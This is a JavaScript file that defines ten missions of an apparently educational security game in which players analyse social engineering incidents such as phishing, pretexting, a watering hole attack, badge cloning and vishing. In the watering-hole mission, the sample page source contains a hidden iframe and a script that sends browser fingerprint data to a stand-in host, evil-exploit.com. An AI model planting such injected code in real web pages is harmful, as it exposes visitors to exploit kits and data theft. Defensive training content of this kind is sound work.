// Chapter 4: Social Engineering (Missions 36-45)
const mk=(id,n,l,t,c,b,o,i,co,fs,p,h,pk,sc,tr,ex={})=>({id,name:n,level:l,estimatedTime:t,unlockedCommands:c,briefing:`[SECURE MESSAGE]\n\n${b}\n\n— Handler`,objective:o,story:{intro:i,completion:co},filesystem:fs,initialPath:p,hints:h,progressKeys:pk,successCondition:sc,triggers:tr,...ex});

export const mission36=mk('mission36','Phishing Drill',36,7,
  ['ls','cd','cat','grep','help','clear','pwd','hint','status'],
  "Analyze 5 emails. Identify which ones are phishing attempts by checking sender addresses and URLs.",
  'Identify all phishing emails from the inbox','5 emails, some are phishing.',
  "3 phishing emails identified: fake bank, fake IT, fake CEO.",
  {'inbox':{'email_1.txt':'From: security@bankofamerica-verify.com ⚠️\nSubject: Account Suspended\nClick http://b0fa-login.evil.com to verify\n\nANALYSIS: PHISHING\n- Fake domain (bankofamerica-verify.com)\n- Suspicious URL','email_2.txt':'From: hr@company.com ✅\nSubject: Holiday Schedule\nPlease see attached Q2 holiday calendar.\n\nANALYSIS: LEGITIMATE\n- Internal domain\n- Normal content','email_3.txt':'From: it-support@c0mpany.com ⚠️\nSubject: Password Expiry\nClick to reset: http://c0mpany-reset.info\n\nANALYSIS: PHISHING\n- Typo domain (c0mpany with zero)\n- External reset link','email_4.txt':'From: newsletter@techcrunch.com ✅\nSubject: Weekly Tech News\nTop stories this week...\n\nANALYSIS: LEGITIMATE\n- Known sender\n- Normal newsletter','email_5.txt':'From: ceo@company.com.evil.net ⚠️\nSubject: URGENT Wire Transfer\nSend $50K to acct 847291038 NOW\n\nANALYSIS: PHISHING\n- Subdomain trick (company.com.evil.net)\n- Urgency + wire transfer','report.txt':'PHISHING REPORT:\nTotal emails: 5\nPhishing: 3 (#1, #3, #5)\nLegitimate: 2 (#2, #4)\n\nIndicators found:\n- Fake domains\n- Urgency tactics\n- Suspicious URLs'}},
  '/inbox',["Read each email carefully.","Check sender domains and URLs.","The report summarizes findings."],
  ['readEmails','foundPhishing'],(p)=>p.readEmails&&p.foundPhishing,
  [{command:'cat',args:['email_1.txt'],progressUpdate:{readEmails:true}},
   {command:'cat',args:['report.txt'],progressUpdate:{foundPhishing:true},narrative:'🎣 3 phishing emails identified! Fake domains, urgency, suspicious URLs.'}]
);

export const mission37=mk('mission37','Pretexting',37,7,
  ['ls','cd','cat','grep','help','clear','pwd','hint','status'],
  "An attacker called our help desk posing as a new employee. Analyze the call transcript to identify social engineering tactics used.",
  'Identify all social engineering tactics in the call transcript','Help desk social engineering call.',
  "5 tactics identified: pretexting, urgency, authority, empathy, information gathering.",
  {'call_analysis':{'transcript.txt':'HELP DESK CALL TRANSCRIPT:\n\nCaller: "Hi, I\'m Jake from the marketing team, just started Monday."\n[TACTIC: Pretexting - fake identity]\n\nCaller: "My laptop isn\'t connecting and I have a presentation in 30 minutes!"\n[TACTIC: Urgency - time pressure]\n\nCaller: "Sarah Chen from HR said you could help me reset my password."\n[TACTIC: Authority - name-dropping]\n\nCaller: "I\'m really stressed, everyone\'s counting on me for this presentation."\n[TACTIC: Empathy - emotional manipulation]\n\nCaller: "What\'s the VPN server address? And the admin portal URL?"\n[TACTIC: Information gathering - extracted network info]\n\nAgent: Provided VPN address and reset password to "Welcome123"\n[RESULT: Caller obtained network access credentials]','analysis.txt':'SOCIAL ENGINEERING ANALYSIS:\n\n5 tactics identified:\n1. PRETEXTING: Fake identity as new employee\n2. URGENCY: 30-minute deadline\n3. AUTHORITY: Name-dropped HR director\n4. EMPATHY: Stressed/emotional appeal\n5. INFO GATHERING: Extracted VPN & portal URLs\n\nResult: Attacker obtained:\n- VPN server address\n- Admin portal URL\n- Valid credentials (Welcome123)\n\nSeverity: CRITICAL\nThe help desk agent violated security policy.'}},
  '/call_analysis',["Read the transcript carefully.","Each section is labeled with a tactic.","The analysis summarizes all tactics."],
  ['readTranscript','identified'],(p)=>p.readTranscript&&p.identified,
  [{command:'cat',args:['transcript.txt'],progressUpdate:{readTranscript:true},narrative:'📞 Multiple social engineering tactics detected in this call...'},
   {command:'cat',args:['analysis.txt'],progressUpdate:{identified:true},narrative:'🎭 5 tactics: pretexting, urgency, authority, empathy, info gathering. Attacker got VPN access!'}]
);

export const mission38=mk('mission38','Watering Hole',38,8,
  ['ls','cd','cat','grep','analyze','help','clear','pwd','hint','status'],
  "Employees visiting an industry news site got infected. The site was compromised as a watering hole attack. Analyze the infected page source.",
  'Find the malicious code injected into the compromised website','Website used as watering hole.',
  "Hidden iframe loads exploit kit from evil-exploit.com, targeting browser vulnerabilities.",
  {'site_analysis':{'page_source.txt':'<html>\n<head><title>Industry News Daily</title></head>\n<body>\n  <h1>Latest Industry News</h1>\n  <p>Today in technology...</p>\n  <!-- Normal content above -->\n  \n  <!-- INJECTED CODE BELOW (hidden from view) -->\n  <iframe src="http://evil-exploit.com/kit" \n    width="0" height="0" \n    style="display:none">\n  </iframe>\n  <script>\n    // Fingerprints browser and sends to C2\n    var d=navigator.userAgent+"|"+navigator.plugins.length;\n    new Image().src="http://evil-exploit.com/fp?d="+btoa(d);\n  </script>\n</body></html>','server_logs.txt':'INFECTED EMPLOYEES:\n- 12 employees visited the site\n- 8 got infected (vulnerable browsers)\n- 4 were protected (updated browsers)\n\nExploit: CVE-2024-1234 (browser RCE)\nPayload: Keylogger + screen capture','ioc_report.txt':'INDICATORS OF COMPROMISE:\n\nDomain: evil-exploit.com\nIP: 185.220.101.99\nIframe: Hidden 0x0 pixel\nScript: Browser fingerprinting\nPayload: Memory-resident keylogger\n\nRemediation:\n1. Block evil-exploit.com at firewall\n2. Re-image 8 infected machines\n3. Rotate all credentials'}},
  '/site_analysis',["Read the page source — look for hidden elements.","An invisible iframe and script were injected.","The IOC report has full details."],
  ['foundInjection','readIOC'],(p)=>p.foundInjection&&p.readIOC,
  [{command:'cat',args:['page_source.txt'],progressUpdate:{foundInjection:true},narrative:'💉 Hidden iframe + fingerprinting script found! Loads exploit kit from evil-exploit.com.'},
   {command:'cat',args:['ioc_report.txt'],progressUpdate:{readIOC:true},narrative:'🔍 8 employees infected via browser RCE. Keylogger + screen capture deployed.'}]
);

export const mission39=mk('mission39','Badge Cloning',39,8,
  ['ls','cd','cat','grep','help','clear','pwd','hint','status'],
  "RFID access badges were cloned. Analyze badge reader logs to find who used a cloned badge and which areas were accessed.",
  'Find the cloned badge usage in access logs','Cloned RFID badges detected.',
  "Badge #4477 was cloned. Used at server room at 2AM while real owner was at home.",
  {'badge_investigation':{'reader_logs.txt':'BADGE READER LOG:\n08:00 Badge#1234 (J.Smith) → Lobby ✅\n08:15 Badge#5678 (M.Jones) → Lobby ✅\n08:30 Badge#4477 (L.Park) → Lobby ✅\n14:00 Badge#4477 (L.Park) → Lab ✅\n17:30 Badge#4477 (L.Park) → Exit ✅\n02:15 Badge#4477 (L.Park) → Server Room ⚠️\n02:45 Badge#4477 (L.Park) → Data Center ⚠️\n03:10 Badge#4477 (L.Park) → Exit ⚠️','timeline.txt':'TIMELINE ANALYSIS:\n\nL.Park (Badge#4477):\n  08:30 — Entered lobby (normal)\n  14:00 — Entered lab (normal)\n  17:30 — Exited building (went home)\n  02:15 — Server room entry ⚠️ ANOMALY\n  02:45 — Data center entry ⚠️ ANOMALY\n  03:10 — Exited building ⚠️ ANOMALY\n\nL.Park confirmed at home 02:00-07:00\n→ Badge was CLONED and used by someone else!','camera_footage.txt':'SECURITY CAMERA NOTES:\n02:15 — Unidentified male, hoodie, used Badge#4477\n  NOT L.Park (different build, height)\n02:20 — Connected laptop to server rack #7\n02:40 — Removed USB device from data center\n03:10 — Exited through fire exit (no camera)'}},
  '/badge_investigation',["Check badge reader logs for unusual times.","Badge#4477 was used at 2AM after the owner left.","Camera footage confirms a different person used the badge."],
  ['foundAnomaly','confirmed'],(p)=>p.foundAnomaly&&p.confirmed,
  [{command:'cat',args:['timeline.txt'],progressUpdate:{foundAnomaly:true},narrative:'🔒 Badge#4477 used at 2AM while owner L.Park was at home! Badge was cloned!'},
   {command:'cat',args:['camera_footage.txt'],progressUpdate:{confirmed:true},narrative:'📹 Camera confirms: different person used cloned badge. Connected laptop to server, took USB from data center.'}]
);

export const mission40=mk('mission40','Deepfake Voice',40,8,
  ['ls','cd','cat','grep','analyze','help','clear','pwd','hint','status'],
  "A CFO approved a $3M transfer via phone call. But audio analysis suggests the voice was AI-generated. Analyze the evidence.",
  'Determine if the phone call used deepfake voice technology','Possible deepfake voice fraud.',
  "Voice confirmed as AI-generated deepfake. Real CFO was on a plane during the call.",
  {'deepfake_case':{'call_metadata.txt':'CALL DETAILS:\nTime: 2024-04-12 14:30\nFrom: +1-555-0199 (CFO personal phone?)\nTo: +1-555-0100 (Finance dept)\nDuration: 3 minutes 42 seconds\nContent: Authorized $3M wire transfer','audio_analysis.txt':'VOICE ANALYSIS (AI Detection):\n\nSpectral Analysis:\n  - Frequency patterns: ARTIFICIAL ⚠️\n  - Missing micro-variations in pitch\n  - Breathing patterns: TOO REGULAR\n  - Background noise: SYNTHETIC\n\nAI Confidence Score: 97.3% DEEPFAKE\n\nComparison with known CFO recordings:\n  - Voice timbre: 94% match (good clone)\n  - Speech patterns: 88% match\n  - Micro-expressions: 12% match ⚠️ (dead giveaway)\n\nConclusion: AI-GENERATED VOICE','alibi.txt':'CFO LOCATION AT TIME OF CALL:\n\nFlight records:\n  UA 1547: LAX → JFK\n  Departure: 14:00 (30 min before call)\n  Status: IN AIR during call\n\nPhone records:\n  CFO personal phone: Airplane mode from 13:55\n  No outgoing calls 14:00-18:30\n\nThe caller number +1-555-0199 is a VOIP number,\nnot the CFO\'s actual phone (+1-555-0188).'}},
  '/deepfake_case',["Check the audio analysis for AI detection.","The alibi proves the CFO couldn't have made the call.","The phone number used was VOIP, not the CFO's real number."],
  ['foundDeepfake','provedAlibi'],(p)=>p.foundDeepfake&&p.provedAlibi,
  [{command:'cat',args:['audio_analysis.txt'],progressUpdate:{foundDeepfake:true},narrative:'🤖 97.3% deepfake confidence! AI-generated voice clone of the CFO.'},
   {command:'cat',args:['alibi.txt'],progressUpdate:{provedAlibi:true},narrative:'✈️ CFO was on a plane during the call. Phone was in airplane mode. The caller used VOIP — confirmed fraud!'}]
);

export const mission41=mk('mission41','Dumpster Dive',41,7,
  ['ls','cd','cat','grep','help','clear','pwd','hint','status'],
  "Shredded documents were recovered from a company's trash. Piece together the fragments to find leaked credentials.",
  'Reconstruct shredded documents to find credentials','Shredded docs from dumpster.',
  "Reconstructed: Server room door code (4521), WiFi password (Qu4ntum!2024), and admin credentials.",
  {'dumpster':{'fragment_1.txt':'...erver Room D...\n...ode: 452...\n...contact IT f...','fragment_2.txt':'...iFi Passwo...\n...Qu4ntum!202...\n...do not sha...','fragment_3.txt':'...dmin Creden...\n...ser: sysadm...\n...word: P@ssw0...\n...hange month...','reconstruction.txt':'RECONSTRUCTED DOCUMENTS:\n\nDocument 1: Server Room Door Code: 4521\nDocument 2: WiFi Password: Qu4ntum!2024\nDocument 3: Admin Credentials:\n  User: sysadmin\n  Pass: P@ssw0rd!\n  Note: Change monthly\n\n⚠️ All credentials compromised!\nImmediate rotation required.'}},
  '/dumpster',["Read each fragment — they're pieces of shredded documents.","The fragments contain partial credentials.","Reconstruction.txt has the full recovered text."],
  ['readFragments','foundCreds'],(p)=>p.readFragments&&p.foundCreds,
  [{command:'cat',args:['fragment_1.txt'],progressUpdate:{readFragments:true}},
   {command:'cat',args:['reconstruction.txt'],progressUpdate:{foundCreds:true},narrative:'🗑️ Full credentials reconstructed from trash! Door code, WiFi pass, and admin login all exposed.'}]
);

export const mission42=mk('mission42','Evil Twin WiFi',42,8,
  ['ls','cd','cat','grep','analyze','help','clear','pwd','hint','status'],
  "Someone set up a fake WiFi hotspot mimicking our corporate network. Users connecting to it have their traffic intercepted. Find the evil twin.",
  'Find the evil twin WiFi access point','Fake WiFi hotspot detected.',
  "Evil twin 'CorpWiFi' at MAC DD:EE:FF:00:11:22 vs legitimate AA:BB:CC:DD:EE:FF. 15 users compromised.",
  {'wifi_scan':{'ap_list.txt':'DETECTED ACCESS POINTS:\n\nSSID: CorpWiFi-5G\n  MAC: AA:BB:CC:DD:EE:FF\n  Channel: 36\n  Signal: -45dBm\n  Security: WPA2-Enterprise\n  Status: LEGITIMATE ✅\n\nSSID: CorpWiFi-5G\n  MAC: DD:EE:FF:00:11:22\n  Channel: 36\n  Signal: -30dBm (STRONGER ⚠️)\n  Security: WPA2-PSK (WRONG TYPE ⚠️)\n  Status: EVIL TWIN ⚠️\n\nSSID: Guest-WiFi\n  MAC: AA:BB:CC:DD:EE:00\n  Status: LEGITIMATE ✅','connected_users.txt':'USERS ON EVIL TWIN AP:\n15 devices connected to DD:EE:FF:00:11:22\n\nAll traffic visible to attacker:\n- 8 checked email (credentials captured)\n- 4 accessed banking (possible fraud)\n- 3 used company VPN (VPN protected them)','ap_comparison.txt':'COMPARISON:\n                    LEGIT           EVIL TWIN\nMAC:                AA:BB:CC:...    DD:EE:FF:...\nSecurity:           WPA2-Enterprise WPA2-PSK ⚠️\nSignal:             -45dBm          -30dBm (stronger)\nCertificate:        DigiCert        Self-signed ⚠️\nDHCP Server:        10.0.0.1        192.168.1.1 ⚠️\n\nThe evil twin has stronger signal to lure victims.'}},
  '/wifi_scan',["Check ap_list.txt for duplicate SSIDs.","Same name but different MAC and security type = evil twin.","ap_comparison.txt shows all differences."],
  ['foundTwin','assessedDamage'],(p)=>p.foundTwin&&p.assessedDamage,
  [{command:'cat',args:['ap_list.txt'],progressUpdate:{foundTwin:true},narrative:'📡 Evil twin found! Same SSID but MAC DD:EE:FF:00:11:22, stronger signal, wrong security type.'},
   {command:'cat',args:['connected_users.txt'],progressUpdate:{assessedDamage:true},narrative:'👥 15 users on evil twin! 8 email credentials captured, 4 banking sessions intercepted.'}]
);

export const mission43=mk('mission43','QR Code Trap',43,7,
  ['ls','cd','cat','grep','help','clear','pwd','hint','status'],
  "Malicious QR codes were placed over legitimate ones in the office. Analyze the URLs they point to.",
  'Identify malicious QR codes and their destination URLs','Tampered QR codes in office.',
  "3 QR codes replaced: cafeteria menu → phishing, meeting room → malware, parking → credential harvester.",
  {'qr_scan':{'qr_report.txt':'QR CODE AUDIT:\n\nLocation: Cafeteria\n  Expected: menu.company.com/lunch\n  Actual: menu-company.evil.com/lunch ⚠️ PHISHING\n  Sticker: Placed OVER original QR\n\nLocation: Meeting Room B\n  Expected: rooms.company.com/book\n  Actual: bit.ly/xK9mZ2 → malware.evil.com ⚠️ MALWARE\n  Sticker: Placed OVER original QR\n\nLocation: Parking Garage\n  Expected: parking.company.com/pay\n  Actual: parking-c0mpany.com/pay ⚠️ CREDENTIAL HARVEST\n  Sticker: Placed OVER original QR\n\nLocation: Lobby\n  Expected: company.com/welcome\n  Actual: company.com/welcome ✅ NOT TAMPERED','impact.txt':'IMPACT ASSESSMENT:\n\nCafeteria QR: ~50 employees scanned/day\n  Risk: Login credentials stolen\n\nMeeting Room QR: ~20 employees/day\n  Risk: Malware installed on phones\n\nParking QR: ~30 employees/day\n  Risk: Credit card numbers stolen\n\nTotal exposure: ~100 employees/day\nDays active: ~5 (estimated)\nPotential victims: 500+'}},
  '/qr_scan',["Read the QR code audit report.","Compare expected vs actual URLs.","The impact assessment shows how many people were affected."],
  ['foundFakeQR','assessedImpact'],(p)=>p.foundFakeQR&&p.assessedImpact,
  [{command:'cat',args:['qr_report.txt'],progressUpdate:{foundFakeQR:true},narrative:'📱 3 tampered QR codes found! Cafeteria, meeting room, and parking all redirect to attacker sites.'},
   {command:'cat',args:['impact.txt'],progressUpdate:{assessedImpact:true},narrative:'⚠️ ~500 employees potentially affected over 5 days. Credentials, malware, and credit cards at risk.'}]
);

export const mission44=mk('mission44','Vishing Attack',44,8,
  ['ls','cd','cat','grep','help','clear','pwd','hint','status'],
  "Bank customers received calls from someone posing as fraud department. Analyze call recordings transcripts to build the attacker profile.",
  'Analyze vishing call transcripts to profile the attacker','Phone fraud targeting bank customers.',
  "Serial visher using VOIP from 3 numbers. 47 victims, $230K stolen across 6 banks.",
  {'vishing':{'call_1.txt':'TRANSCRIPT (Victim: Mrs. Anderson)\n\nAttacker: "This is Chase fraud department. We detected unauthorized charges on your account."\n[Victim provides card number and PIN]\nAttacker: "I\'ll block those charges now."\n[Actually made 3 purchases totaling $5,200]','call_2.txt':'TRANSCRIPT (Victim: Mr. Patel)\n\nAttacker: "Bank of America security. Your account has been compromised and we need to verify your identity."\n[Victim provides SSN and DOB]\nAttacker: "Thank you, we\'ve secured your account."\n[Actually opened 2 credit cards in victim\'s name]','profile.txt':'ATTACKER PROFILE:\n\nVOIP Numbers used: +1-555-0301, 0302, 0303\nCall pattern: 9AM-5PM EST weekdays\nAccent: None (possibly voice changer)\nTargets: Elderly customers\nBanks impersonated: Chase, BofA, Wells Fargo, Citi, Capital One, US Bank\n\nStatistics:\n  Total calls: 200+\n  Successful scams: 47\n  Total stolen: $230,000\n  Average per victim: $4,893'}},
  '/vishing',["Read the call transcripts.","Notice the consistent tactics across calls.","The profile summarizes the attacker's MO."],
  ['readCalls','profiled'],(p)=>p.readCalls&&p.profiled,
  [{command:'cat',args:['call_1.txt'],progressUpdate:{readCalls:true},narrative:'📞 Classic vishing: Fake fraud department call extracts card numbers and PINs.'},
   {command:'cat',args:['profile.txt'],progressUpdate:{profiled:true},narrative:'🎭 Serial visher: 47 victims, $230K stolen, 6 banks impersonated. VOIP numbers traced.'}]
);

export const mission45=mk('mission45','Insider Trading',45,9,
  ['ls','cd','cat','grep','analyze','help','clear','pwd','hint','status'],
  "An employee is leaking confidential merger plans. Analyze communication patterns, trading records, and access logs to identify the leaker.",
  'Identify the employee leaking merger information','Insider trading investigation.',
  "CFO's assistant Karen Lee: timed stock trades, encrypted messages to trader, after-hours access to merger docs.",
  {'trading_case':{'suspects.txt':'SUSPECTS (access to merger docs):\n1. Tom Harris (Legal) — No unusual trades ✅\n2. Karen Lee (CFO Assistant) — ⚠️ FLAGGED\n3. Mike Chen (Board Secretary) — No unusual trades ✅\n4. Lisa Wang (Investor Relations) — No unusual trades ✅','trading_records.txt':'STOCK TRADING ANALYSIS:\n\nKaren Lee trading account:\n  2024-03-01: Bought 500 shares TargetCorp ($45)\n  2024-03-15: Merger announced, stock jumped to $78\n  2024-03-15: Sold 500 shares ($78) = $16,500 profit\n\nTiming: Bought 2 weeks before public announcement\nPattern: 3 similar trades in past year\nTotal profit: $48,000 from pre-announcement trades','comms.txt':'KAREN LEE COMMUNICATIONS:\n\nEncrypted messages to unknown contact:\n  "Package ready for delivery" (sent before each trade)\n  "Green light confirmed" (sent day before announcements)\n  \nContact traced to: David Reeves, hedge fund trader\nRelationship: College roommate\n\nAccess log: Opened merger docs at 11PM on Feb 28\n(merger announced March 15)'}},
  '/trading_case',["Check suspects for flagged individuals.","Trading records show suspicious timing.","Communications reveal the connection."],
  ['foundSuspect','provedLeak'],(p)=>p.foundSuspect&&p.provedLeak,
  [{command:'cat',args:['trading_records.txt'],progressUpdate:{foundSuspect:true},narrative:'📈 Karen Lee bought stock 2 weeks before merger announcement. $48K profit from 3 insider trades!'},
   {command:'cat',args:['comms.txt'],progressUpdate:{provedLeak:true},narrative:'💬 Encrypted messages to hedge fund trader before each trade. Access logs confirm after-hours document viewing. Case proven!'}]
);

export const chapter4Missions=[mission36,mission37,mission38,mission39,mission40,mission41,mission42,mission43,mission44,mission45];
